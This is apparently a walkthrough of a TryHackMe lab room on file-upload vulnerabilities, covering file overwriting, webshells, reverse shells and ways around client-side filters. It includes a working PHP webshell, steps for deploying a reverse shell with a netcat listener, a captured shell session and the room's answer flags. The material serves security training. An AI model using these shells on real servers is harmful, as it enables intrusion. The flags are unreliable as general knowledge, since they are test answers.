# Upload Vulnerabilities

Tutorial room exploring some basic file-upload vulnerabilities in websites

[Upload Vulnerabilities](https://tryhackme.com/room/uploadvulns)

## Task 1 Getting Started

First up, let's deploy the machine to give it a few minutes to boot.

Once you've clicked deploy, you'll need to configure your own computer to be able to connect.
(Note: This is an abnormal step for a TryHackMe machine, but must be completed in order to access the practical content of this room)

If you've successfully deployed the machine then the following commands will already have the IP address filled in. If any of them have "MACHINE_IP" in them, then you still need to deploy the machine, and the following instructions will not work.

**If you're using Linux or MacOS**, open up a terminal and type in the following command, then hit enter:

```
echo "MACHINE_IP    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm" | sudo tee -a /etc/hosts
```

When you finish the room, run this command to revert the hosts file back to normal:

```
sudo sed -i '$d' /etc/hosts
```

**If you're using Windows**, open an Administrator Powershell window by searching for "Powershell", right clicking on "Windows Powershell", then clicking "Run as administrator".

![](https://i.imgur.com/kZG7lVM.png)

Type the following command and hit enter:

```ps1
AC C:\Windows\System32\drivers\etc\hosts "MACHINE_IP   overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm"
```

When you finish the room, use this command to revert the hosts file back to normal:

```ps1
(GC C:\Windows\System32\drivers\etc\hosts | select -Skiplast 1) | SC C:\Windows\System32\drivers\etc\hosts
```

You should now be able to access the virtual machine, so let's get started!

1. Configure your hosts file for the task, as per the instructions above.

`No answer needed`

## Task 2 Introduction

The ability to upload files to a server has become an integral part of how we interact with web applications. Be it a profile picture for a social media website, a report being uploaded to cloud storage, or saving a project on Github; the applications for file upload features are limitless.

Unfortunately, when handled badly, file uploads can also open up severe vulnerabilities in the server. This can lead to anything from relatively minor, nuisance problems; all the way up to full Remote Code Execution (RCE) if an attacker manages to upload and execute a shell. With unrestricted upload access to a server (and the ability to retrieve data at will), an attacker could deface or otherwise alter existing content -- up to and including injecting malicious webpages, which lead to further vulnerabilities such as XSS or CSRF. By uploading arbitrary files, an attacker could potentially also use the server to host and/or serve illegal content, or to leak sensitive information. Realistically speaking, an attacker with the ability to upload a file of their choice to your server -- with no restrictions -- is very dangerous indeed.

The purpose of this room is to explore some of the vulnerabilities resulting from improper (or inadequate) handling of file uploads. Specifically, we will be looking at:

* Overwriting existing files on a server
* Uploading and Executing Shells on a server
* Bypassing Client-Side filtering
* Bypassing various kinds of Server-Side filtering
* Fooling content type validation checks

Let's begin!

1. Read and understand the above information.

`No answer needed`

## Task 3 General Methodology

So, we have a file upload point on a site. How would we go about exploiting it?

As with any kind of hacking, enumeration is key. The more we understand about our environment, the more we're able to do with it. Looking at the source code for the page is good to see if any kind of client-side filtering is being applied. Scanning with a directory bruteforcer such as Gobuster is usually helpful in web attacks, and may reveal where files are being uploaded to; Gobuster is no longer installed by default on Kali, but can be installed with `sudo apt install gobuster`. Intercepting upload requests with [Burpsuite](https://blog.tryhackme.com/setting-up-burp/) will also come in handy. Browser extensions such as [Wappalyser](https://www.wappalyzer.com/download) can provide valuable information at a glance about the site you're targetting.

With a basic understanding of how the website might be handling our input, we can then try to poke around and see what we can and can't upload. If the website is employing client-side filtering then we can easily look at the code for the filter and look to bypass it (more on this later!). If the website has server-side filtering in place then we may need to take a guess at what the filter is looking for, upload a file, then try something slightly different based on the error message if the upload fails. Uploading files designed to provoke errors can help with this. Tools like Burpsuite or OWASP Zap can extremely be very helpful at this stage.

We'll go into a lot more detail about bypassing filters in later tasks.

1. Read the General Methodology

`No answer needed`

## Task 4 Overwriting Existing Files

When files are uploaded to the server, a range of checks should be carried out to ensure that the file will not overwrite anything which already exists on the server. Common practice is to assign the file with a new name -- often either random, or with the date and time of upload added to the start or end of the original filename. Alternatively, checks may be applied to see if the filename already exists on the server; if a file with the same name already exists then the server will return an error message asking the user to pick a different file name. File permissions also come into play when protecting existing files from being overwritten. Web pages, for example, should not be writeable to the web user, thus preventing them from being overwritten with a malicious version uploaded by an attacker.
If, however, no such precautions are taken, then we might potentially be able to overwrite existing files on the server. Realistically speaking, the chances are that file permissions on the server will prevent this from being a serious vulnerability. That said, it could still be quite the nuisance, and is worth keeping an eye out for in a pentest or bug hunting environment.

Let's go through an example before you try this for yourself. Please note that demo.uploadvulns.thm will be used for all demonstrations; however, this site is not available in the uploaded VM. It is purely for demonstrative purposes.

In the following image we have a web page with an upload form:

![](https://i.imgur.com/7KmsrTW.png)

You may need to enumerate more than this for a real challenge; however, in this instance, let's just take a look at the source code of the page:

![](https://i.imgur.com/BeqAZ3s.png)

Inside the red box, we see the code that's responsible for displaying the image that we saw on the page. It's being sourced from a file called "spaniel.jpg", inside a directory called "images".

Now we know where the image is being pulled from -- can we overwrite it?

Let's download another image from the internet and call it `spaniel.jpg`. We'll then upload it to the site and see if we can overwrite the existing image:

![](https://i.imgur.com/8PiIuiu.png)

![](https://i.imgur.com/TIoA2DR.png)

And our attack was successful! We managed to overwrite the original `images/spaniel.jpg` with our own copy.

Now, let's put this into practice.

Open your web browser and navigate to `overwrite.uploadvulns.thm`. Your goal is to overwrite a file on the server with an upload of your own.

1. What is the name of the image file which can be overwritten?

`mountains.jpg`

2. Overwrite the image. What is the flag you receive?

```
Well done -- you overwrote the file!
Your flag is: THM{OTBiODQ3YmNjYWZhM2UyMmYzZDNiZjI5} 
```

`THM{OTBiODQ3YmNjYWZhM2UyMmYzZDNiZjI5}`

## Task 5 Remote Code Execution

It's all well and good overwriting files that exist on the server. That's a nuisance to the person maintaining the site, and may lead to some vulnerabilities, but let's go further; let's go for RCE!

Remote Code Execution (as the name suggests) would allow us to execute code arbitrarily on the web server. Whilst this is likely to be as a low-privileged web user account (such as `www-data` on Linux servers), it's still an extremely serious vulnerability. Remote code execution through a web application tends to be a result of uploading a program written in the same language as the back-end of the website (or another language which the server understands and will execute). Traditionally this would be PHP, however, in more recent times, other back-end languages have become more common (Python Django and Javascript in the form of Node.js being prime examples).

There are two basic ways to achieve RCE on a webserver: webshells, and reverse shells. Realistically a fully featured reverse shell is the ideal goal for an attacker; however, a webshell may be the only option available (for example, if a file length limit has been imposed on uploads). We'll take a look at each of these in turn. As a general methodology, we would be looking to upload a shell of one kind or another, then activating it, either by navigating directly to the file if the server allows it, or by otherwise forcing the webapp to run the script for us.

Web shells:

Let's assume that we've found a webpage with an upload form:

![](https://i.imgur.com/GxMJAKH.png)

Where do we go from here? Well, let's start with a gobuster scan:

![](https://i.imgur.com/OftwAIE.png)

Looks like we've got two directories here -- `uploads` and `assets`. Of these, it seems likely that any files we upload will be placed in the "uploads" directory. We'll try uploading a legitimate image file first. Here I am choosing our cute dog photo from the previous task:

![](https://i.imgur.com/aAyIrod.png)

![](https://i.imgur.com/mIbGRIk.png)

Now, if we go to http://demo.uploadvulns.thm/uploads we should see that the spaniel picture has been uploaded!

![](https://i.imgur.com/lVe2tjL.png)

![](https://i.imgur.com/N8vWlVO.png)

Ok, we can upload images. Let's try a webshell now.

As it is, we know that this webserver is running with a PHP back-end, so we'll skip straight to creating and uploading the shell. In real life, we may need to do a little more enumeration; however, PHP is a good place to start regardless.

A simple webshell works by taking a parameter and executing it as a system command. In PHP, the syntax for this would be:

```php
<?php
    echo system($_GET["cmd"]);
?>
```

This code takes a GET parameter and executes it as a system command. It then echoes the output out to the screen.

Let's try uploading it to the site, then using it to show our current user and the contents of the current directory:

![](https://i.imgur.com/CU0Uyx5.png)

Success!

We could now use this shell to read files from the system, or upgrade from here to a reverse shell. Now that we have RCE, the options are limitless. Note that when using webshells, it's usually easier to view the output by looking at the source code of the page. This drastically improves the formatting of the output.

**Reverse Shells:**

The process for uploading a reverse shell is almost identical to that of uploading a webshell, so this section will be shorter. We'll be using the ubiquitous Pentest Monkey reverse shell, which comes by default on Kali Linux, but can also be downloaded [here](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php). You will need to edit line 49 of the shell. It will currently say 
```php
$ip = '127.0.0.1';  // CHANGE THIS
```
 -- as it instructs, change `127.0.0.1` to your TryHackMe tun0 IP address, which can be found on the [access page](https://tryhackme.com/access). You can ignore the following line, which also asks to be changed. With the shell edited, the next thing we need to do is start a Netcat listener to receive the connection. `nc -lvnp 1234`:

![](https://i.imgur.com/ysY306E.png)

Now, let's upload the shell, then activate it by navigating to http://demo.uploadvulns.thm/uploads/shell.php. The name of the shell will obviously be whatever you called it (`php-reverse-shell.php` by default).

The website should hang and not load properly -- however, if we switch back to our terminal, we have a hit!

![](https://i.imgur.com/he0hbiR.png)

Once again, we have obtained RCE on this webserver. From here we would want to stabilise our shell and escalate our privileges, but those are tasks for another time. For now, it's time you tried this for yourself!

Navigate to `shell.uploadvulns.thm` and complete the questions for this task.

1. Run a Gobuster scan on the website using the syntax from the screenshot above. What directory looks like it might be used for uploads? (N.B. This is a good habit to get into, and will serve you well in the upcoming tasks...)

```
kali@kali:~/CTFs/tryhackme/Upload Vulnerabilities$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://shell.uploadvulns.thm
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://shell.uploadvulns.thm
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/09 00:19:21 Starting gobuster
===============================================================
/resources (Status: 301)
/assets (Status: 301)
Progress: 16032 / 220561 (7.27%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/11/09 00:20:13 Finished
===============================================================
```

[http://shell.uploadvulns.thm/resources/](http://shell.uploadvulns.thm/resources/)

2. Get either a web shell or a reverse shell on the machine. What's the flag in the /var/www/ directory of the server?

```
kali@kali:~/CTFs/tryhackme/Upload Vulnerabilities$ nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.5.136 35392
Linux f300b6aced54 4.15.0-109-generic #110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 23:20:38 up 33 min,  0 users,  load average: 0.05, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ cd /var/www/
$ ls
flag.txt
html
$ cat flag.txt
THM{YWFhY2U3ZGI4N2QxNmQzZjk0YjgzZDZk}
```

## Task 6 Filtering

Up until now we have largely been ignoring the counter-defences employed by web developers to defend against file upload vulnerabilities. Every website that you've successfully attacked so far in this room has been completely insecure. It's time that changed. From here on out, we'll be looking at some of the defence mechanisms used to prevent malicious file uploads, and how to circumvent them.

First up, let's discuss the differences between client-side filtering and server-side filtering.

When we talk about a script being "Client-Side", in the context of web applications, we mean that it's running in the user's browser as opposed to on the web server itself. JavaScript is pretty much ubiquitous as the client-side scripting language, although alternatives do exist.  Regardless of the language being used, a client-side script will be run in your web browser. In the context of file-uploads, this means that the filtering occurs before the file is even uploaded to the server. Theoretically, this would seem like a good thing, right? In an ideal world, it would be; however, because the filtering is happening on our computer, it is trivially easy to bypass. As such client-side filtering by itself is a highly insecure method of verifying that an uploaded file is not malicious.

Conversely, as you may have guessed, a server-side script will be run on the server. Traditionally PHP was the predominant server-side language; however, in recent years, other options (C#, Node.js, Python, Ruby on Rails, and a variety of others) have become more widely used. Server-side filtering tends to be more difficult to bypass, as you don't have the code in front of you. As the code is executed on the server, in most cases it will also be impossible to bypass the filter completely; instead we have to form a payload which conforms to the filters in place, but still allows us to execute our code.

With that in mind, let's take a look at some different kinds of filtering.

Extension Validation:

File extensions are used (in theory) to identify the contents of a file. In practice they are very easy to change, so actually don't mean much; however, MS Windows still uses them to identify file types, although Unix based systems tend to rely on other methods, which we'll cover in a bit. Filters that check for extensions work in one of two ways. They either blacklist extensions (i.e. have a list of extensions which are not allowed) or they whitelist extensions (i.e. have a list of extensions which are allowed, and reject everything else).

File Type Filtering:

Similar to Extension validation, but more intensive, file type filtering looks, once again, to verify that the contents of a file are acceptable to upload. We'll be looking at two types of file type validation:

* MIME validation: MIME (**M**ultipurpose **I**nternet **M**ail **E**xtension) types are used as an identifier for files -- originally when transfered as attachments over email, but now also when files are being transferred over HTTP(S). The MIME type for a file upload is attached in the header of the request, and looks something like this:

![](https://i.imgur.com/uptWRKW.png)

* MIME types follow the format `<type>/<subtype>`. In the request above, you can see that the image "spaniel.jpg" was uploaded to the server. As a legitimate JPEG image, the MIME type for this upload was "image/jpeg". The MIME type for a file can be checked client-side and/or server-side; however, as MIME is based on the extension of the file, this is extremely easy to bypass.
* Magic Number validation: Magic numbers are the more accurate way of determining the contents of a file; although, they are by no means impossible to fake. The "magic number" of a file is a string of bytes at the very beginning of the file content which identify the content. For example, a PNG file would have these bytes at the very top of the file: `89 50 4E 47 0D 0A 1A 0A`.
![](https://i.imgur.com/vHQWOgi.png)
Unlike Windows, Unix systems use magic numbers for identifying files; however, when dealing with file uploads, it is possible to check the magic number of the uploaded file to ensure that it is safe to accept. This is by no means a guaranteed solution, but it's more effective than checking the extension of a file.

**File Length Filtering:**

File length filters are used to prevent huge files from being uploaded to the server via an upload form (as this can potentially starve the server of resources). In most cases this will not cause us any issues when we upload shells; however, it's worth bearing in mind that if an upload form only expects a very small file to be uploaded, there may be a length filter in place to ensure that the file length requirement is adhered to. As an example, our fully fledged PHP reverse shell from the previous task is 5.4Kb big -- relatively tiny, but if the form expects a maximum of 2Kb then we would need to find an alternative shell to upload.

**File Name Filtering:**

As touched upon previously, files uploaded to a server should be unique. Usually this would mean adding a random aspect to the file name, however, an alternative strategy would be to check if a file with the same name already exists on the server, and give the user an error if so. Additionally, file names should be sanitised on upload to ensure that they don't contain any "bad characters", which could potentially cause problems on the file system when uploaded (e.g. null bytes or forward slashes on Linux, as well as control characters such as `;` and potentially unicode characters). What this means for us is that, on a well administered system, our uploaded files are unlikely to have the same name we gave them before uploading, so be aware that you may have to go hunting for your shell in the event that you manage to bypass the content filtering.

**File Content Filtering:**

More complicated filtering systems may scan the full contents of an uploaded file to ensure that it's not spoofing its extension, MIME type and Magic Number. This is a significantly more complex process than the majority of basic filtration systems employ, and thus will not be covered in this room.

It's worth noting that none of these filters are perfect by themselves -- they will usually be used in conjunction with each other, providing a multi-layered filter, thus increasing the security of the upload significantly. Any of these filters can all be applied client-side, server-side, or both.

Similarly, different frameworks and languages come with their own inherent methods of filtering and validating uploaded files. As a result, it is possible for language specific exploits to appear; for example, until PHP major version five, it was possible to bypass an extension filter by appending a null byte, followed by a valid extension, to the malicious `.php` file. More recently it was also possible to inject PHP code into the exif data of an otherwise valid image file, then force the server to execute it. These are things that you are welcome to research further, should you be interested.

1. What is the traditional server-side scripting language?

`php`

2. When validating by file extension, what would you call a list of accepted extensions (whereby the server rejects any extension not in the list)?

`whitelist`

3. [Research] What MIME type would you expect to see when uploading a CSV file?

`text/csv`

## Task 7 Bypassing Client-Side Filtering

We'll begin with the first (and weakest) line of defence: Client-Side Filtering.

As mentioned previously, client-side filtering tends to be extremely easy to bypass, as it occurs entirely on a machine that you control. When you have access to the code, it's very easy to alter it.

There are four easy ways to bypass your average client-side file upload filter:

1. Turn off Javascript in your browser -- this will work provided the site doesn't require Javascript in order to provide basic functionality. If turning off Javascript completely will prevent the site from working at all then one of the other methods would be more desirable; otherwise, this can be an effective way of completely bypassing the client-side filter.
2. Intercept and modify the incoming page. Using Burpsuite, we can intercept the incoming web page and strip out the Javascript filter before it has a chance to run. The process for this will be covered below.
3. Intercept and modify the file upload. Where the previous method works before the webpage is loaded, this method allows the web page to load as normal, but intercepts the file upload after it's already passed (and been accepted by the filter). Again, we will cover the process for using this method in the course of the task.
4. Send the file directly to the upload point. Why use the webpage with the filter, when you can send the file directly using a tool like `curl`? Posting the data directly to the page which contains the code for handling the file upload is another effective method for completely bypassing a client side filter. We will not be covering this method in any real depth in this tutorial, however, the syntax for such a command would look something like this: `curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>`. To use this method you would first aim to intercept a successful upload (using Burpsuite or the browser console) to see the parameters being used in the upload, which can then be slotted into the above command.

We will be covering methods two and three in depth below.

Let's assume that, once again, we have found an upload page on a website:

![](https://i.imgur.com/fI67jX0.png)

As always, we'll take a look at the source code. Here we see a basic Javascript function checking for the MIME type of uploaded files:

![](https://i.imgur.com/TrI5jQD.png)

In this instance we can see that the filter is using a whitelist to exclude any MIME type that isn't `image/jpeg`.

Our next step is to attempt a file upload -- as expected, if we choose a JPEG, the function accepts it. Anything else and the upload is rejected.

Having established this, let's start [Burpsuite](https://blog.tryhackme.com/setting-up-burp/) and reload the page. We will see our own request to the site, but what we really want to see is the server's response, so right click on the intercepted data, scroll down to "Do Intercept", then select "Response to this request":

![](https://i.imgur.com/T0RjAry.png)

When we click the "Forward" button at the top of the window, we will then see the server's response to our request. Here we can delete, comment out, or otherwise break the Javascript function before it has a chance to load:

![](https://i.imgur.com/ACgWLpH.png)

Having deleted the function, we once again click "Forward" until the site has finished loading, and are now free to upload any kind of file to the website:

![](https://i.imgur.com/5cyqjqa.png)

It's worth noting here that Burpsuite will not, by default, intercept any external Javascript files that the web page is loading. If you need to edit a script which is not inside the main page being loaded, you'll need to go to the "Options" tab at the top of the Burpsuite window, then under the "Intercept Client Requests" section, edit the condition of the first line to remove `^js$|`:

![](https://i.imgur.com/95hi6pX.png)

We've already bypassed this filter by intercepting and removing it prior to the page being loaded, but let's try doing it by uploading a file with a legitimate extension and MIME type, then intercepting and correcting the upload with Burpsuite.

Having reloaded the webpage to put the filter back in place, let's take the reverse shell that we used before and rename it to be called "shell.jpg". As the MIME type (based on the file extension) automatically checks out, the Client-Side filter lets our payload through without complaining:

![](https://i.imgur.com/WNpruFM.png)

Once again we'll activate our Burpsuite intercept, then click "Upload" and catch the request:

![](https://i.imgur.com/h2164Li.png)

Observe that the MIME type of our PHP shell is currently `image/jpeg`. We'll change this to `text/x-php`, and the file extension from `.jpg` to `.php`, then forward the request to the server:

![](https://i.imgur.com/sqmwssT.png)

Now, when we navigate to http://demo.uploadvulns.thm/uploads/shell.php having set up a netcat listener, we receive a connection from the shell!

![](https://i.imgur.com/cUqNO2L.png)

We've covered in detail two ways to bypass a Client-Side file upload filter. Now it's time for you to give it a shot for yourself! Navigate to [java.uploadvulns.thm](java.uploadvulns.thm) and bypass the filter to get a reverse shell. Remember that not all client-side scripts are inline! As mentioned previously, Gobuster would be a very good place to start here -- the upload directory name will be changing with every new challenge.

1. What is the flag in /var/www/?

``

## Task 8 Bypassing Server-Side Filtering: File Extensions
## Task 9 Bypassing Server-Side Filtering: Magic Numbers
## Task 10 Example Methodology
## Task 11 Challenge
## Task 12 Conclusion

Well, that's us done. Hopefully you've learnt something from completing this room. This was a very brief introduction to the basics of file upload vulnerabilities -- there is a lot more to learn! Use what you've learnt here to go and research more advanced exploits related to malicious file uploads.

Now that you've finished the room, remember to revert the changes you made your hosts file, way back in Task 1.

As a reminder, here are the commands to do so.

**On Linux or MacOS:**

`sudo sed -i '$d' /etc/hosts`

**On Windows:**

`(GC C:\Windows\System32\drivers\etc\hosts | select -Skiplast 1) | SC C:\Windows\System32\drivers\etc\hosts`

Room completed, and hosts file reverted!

`No answer needed`
